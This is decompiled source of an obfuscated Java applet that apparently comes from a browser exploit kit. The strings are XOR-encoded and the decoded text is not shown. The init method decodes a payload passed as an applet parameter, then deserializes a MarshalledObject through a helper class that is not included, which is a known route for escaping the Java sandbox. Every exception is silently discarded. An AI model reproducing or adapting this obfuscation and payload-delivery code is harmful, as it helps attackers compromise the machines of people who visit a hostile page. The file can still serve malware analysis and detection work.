import java.rmi.MarshalledObject;
import java.io.IOException;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class main extends JApplet
{
    public static String __X;
    public static String __k;
    static String __K;
    
    public static void main(final String[] array) throws IOException {
    }
    
    @Override
    public void init() {
        final String applet6e = Applet6e("qAB_QAW\u0000^x\u0011\u0012\u000f\u0001\u0011\u0004_^\rSR\u000e\u000f/\u001f\u0000\u001d\u0017\u0007C\u0013FF@H;12/!1up}\b:; (:.g7\u0013#$93#:alK\u0017\u0003=O~VMIFO");
        final String applet6e2 = Applet6e("{!$;=QZAE/\b\u0019\u001c \u000ePZp2Vt[ \u0011\u0014\u001a ,\u0000P-sRYB\u0000VDC*\u001fybot\u001c\u0001\"K\u0006\u0007eV\tFC\u001b\"0\u001bg[I\u000e\b\nZ~\u0015\u00055X'");
        main.__X = this.getParameter(Applet6e("(\u0014"));
        main.__X = __j(main.__X, applet6e2, applet6e);
        main.__k = Applet6e("yHHT");
        if (main.__X == null) {
            return;
        }
        MarshalledObject marshalledObject = null;
        try {
            marshalledObject = (MarshalledObject)Applet107495e.__F(main.__K, this.getClass());
        }
        catch (IOException ex) {}
        catch (ClassNotFoundException ex2) {}
        try {
            if (marshalledObject != null) {
                Applet107495e.__f(marshalledObject);
            }
        }
        catch (Exception ex3) {}
    }
    
    public static String __M(final String s, final String s2) {
        final StringBuffer sb = new StringBuffer();
        final int length = s.length();
        final int length2 = s2.length();
        for (int i = 0; i < length; ++i) {
            sb.append((char)(s.charAt(i) ^ s2.charAt(i % length2)));
        }
        return sb.toString();
    }
    
    public static String Applet6e(final String s) {
        return __M(s, "Appleta7fAppletb86d99bbApplet7f0181Applet375");
    }
    
    public static String __j(final String s, final String s2, final String s3) {
        String string = "";
        for (int i = 0; i < s.length(); ++i) {
            final int index = s2.indexOf(s.substring(i, i + 1));
            if (index > -1) {
                string += s3.substring(index, index + 1);
            }
        }
        return string;
    }
    
    static {
        main.__X = null;
        main.__k = null;
        main.__K = "Appletb3dde6";
    }
}
